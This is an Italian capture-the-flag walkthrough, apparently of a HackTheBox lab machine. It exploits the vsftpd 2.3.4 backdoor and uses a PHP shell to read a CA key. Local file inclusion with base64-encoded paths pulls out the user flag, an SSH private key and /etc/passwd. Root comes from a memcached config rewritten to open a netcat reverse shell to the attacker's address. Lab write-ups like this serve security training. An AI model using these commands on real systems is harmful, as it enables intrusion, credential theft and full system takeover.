@@ -1,0 +1,53 @@
+Controllo vsftp 2.3.4 e vedo che è vulnerabile
+Cerco l'exploit e lo inserisco 
+exploit/unix/ftp/vsftpd_234_backdoor
+Inserisco le options
+L'exploit ha avuto successo ma non sono in grado di aprire una shell
+
+Ascolto con ncat
+nc 10.10.10.131 6200 e sento una Psy Shell in PHP
+help per vedere che comandi posso utilizzare
+con show vedo che ho una variabile
+Trovo il path della ca.key che mi puo permettere di accedere alla parte del sito inaccessibile
+Leggo con
+readfile('/home/nairobi/ca.key')
+A questo punto uso i comandi negli appunti in Cryptography.pdf in Generating a Private SSL certificate to access a HTTPS site
+Copio i comandi presenti nel file
+
+Ho creato il certificato, lo importo nei settings di firefox e posso entrare
+È un sito per scaricare gli episodi della serie
+Controllo se l'URL è vulnerabile a local file inclusion\
+echo -n "../user.txt" | base64
+Inserisco l'output nell'URL in questo modo
+https://10.10.10.131/file/Li4vdXNlci50eHQ=
+
+E ottengo la user flag
+
+Posso ottenere la id_rsa come prima, ma faccio 
+echo -n "../.ssh/id_rsa" | base64
+
+Posso fare un login ora pero' non so ancora in che user fare il login con la key che ho appena preso
+Sempre il solito giochino
+echo -n "../../../etc/passwd" | base64
+Faccio un po'di tentativi perchè trovo sempre passwd.html. 
+Il file corretto è passwd senza estensioni
+
+Lo leggo, ho molti users, li provo tutti, quello corretto è il professore
+ssh -i id_rsa professor@10.10.10.131
+
+Sono dentro
+
+PRIVESC
+Ho un server memcached 
+Entrambi i file sono owned by root come vedo da ls -la
+memcached runna sempre, se riusciamo a mandare una rev shell da memchaced torneremo con una sessione di root visto che entrambi i file sono owned by root
+
+Creeremo un nuovo file con lo stesso nome ma un different command
+echo -ne "[program:memcached]\ncommand = nc 10.10.14.12 4545 -e /bin/bash" > memcached.ini
+
+Dobbiamo solo avviare ncat ed aspettare che memcached funzioni
+Sono dentro come root
+
+
+
+
